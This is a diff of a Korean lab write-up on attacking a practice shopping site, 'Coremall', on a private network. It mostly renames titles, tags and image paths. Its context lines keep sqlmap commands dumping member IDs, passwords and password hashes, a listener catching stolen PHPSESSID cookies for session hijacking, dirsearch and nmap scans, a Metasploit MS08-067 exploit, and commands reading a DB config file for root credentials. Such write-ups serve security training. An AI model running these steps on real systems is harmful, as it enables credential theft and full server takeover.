@@ -1,8 +1,12 @@
 ---
-title: coremall 실습
-date: 2026-04-13
+title: Coremall 웹 취약점 실습
+date: 2026-04-20
 categories:
+  - security
 comments: true
+tags:
+  - 웹취약점
+  - nmap
 ---
 ---
 
@@ -28,10 +32,10 @@ comments: true
 
 	http://192.168.205.100 로 접속
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420170400000.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420170400000.png)
 
 ## 3. Burp Suite를 이용한 요청 캡쳐
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420172331001.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420172331001.png)
 
 
 ## 4. SQL Injection 취약점 확인
@@ -89,7 +93,7 @@ sqlmap -u "http://192.168.205.100/m_view.php?ps_db=notice&ps_boid=10&ps_page=1" 
 -C member_id,member_pass --dump --batch
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420173558002.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420173558002.png)
 
 ---
 ## 5-1 해시값
@@ -132,17 +136,17 @@ python3 -m http.server 9000
 ```
 
 2️⃣ 위 페이로드 삽입
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420183121003.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420183121003.png)
 
 3️⃣ 관리자 클릭
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420183540006.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420183540006.png)
 
 4️⃣ Kali에서 세션 수신
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420183248004.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420183248004.png)
 → /?c=PHPSESSID=...
 
 5️⃣ 쿠키 값 복사 → 브라우저에 적용
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420183359005.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420183359005.png)
 → 밑줄 친 부분을 발견한 세션값으로 수정(1cac... -> 0965...)
 
 	- 브라우저 개발자도구(F12) → Application → Cookies
@@ -157,7 +161,7 @@ python3 -m http.server 9000
 dirsearch -u http://192.168.205.100/ -e php,html,txt
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420190922008.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420190922008.png)
 
 1️⃣ 전체 테이블 탐색
 ```
@@ -188,18 +192,18 @@ sqlmap -u "http://192.168.205.100/m_view.php?ps_db=notice&ps_boid=10&ps_page=1" 
 -C User,Password --dump --batch
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420190803007.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420190803007.png)
 
 ---
 ## 7-1 해시값
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420193552009.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420193552009.png)
 →  root의 해시값은 안나옴
 
 ---
 ## 7-2 DB 접속
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260420193846010.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260420193846010.png)
 → phpadmin 계정은 root 권한이 없다
 → root 계정 찾기위해 windows의 취약점 이용
 
@@ -213,7 +217,7 @@ sqlmap -u "http://192.168.205.100/m_board.php?ps_db=freeboard" --passwords
 nmap -sV -O -p- 192.168.205.100
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421113355001.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421113355001.png)
 → 윈도우 서버인걸 확인
 → MS08-067: Windows Server 서비스의 RPC 취약점으로 인한 원격 코드 실행
 	상대방이 아이디/비밀번호를 입력하지 않아도, **네트워크에 연결되어 있기만 하면** 공격자가 원격에서 그 PC를 완전히 장악할 수 있게 해주는 치명적인 구멍
@@ -227,7 +231,7 @@ set LHOST 192.168.205.128
 exploit
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421113609002.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421113609002.png)
 
 4️⃣ 정보 탈취
 ```
@@ -236,12 +240,12 @@ dir /s /b C:\*.php
 type C:\web\htdocs\config_db.php
 ```
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421113818004.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421113818004.png)
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421113912005.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421113912005.png)
 
 5️⃣ DB 접속 성공(root권한)
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421114119006.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421114119006.png)
 
-![](../../../assets/images/Security/HanSeokJun/2026-04-20-security_013/file-20260421114235007.png)
+![](../../../assets/images/Security/HanSeokJun/2026-04-20-coremall-practice/file-20260421114235007.png)
 → 모든 DB 존재 확인
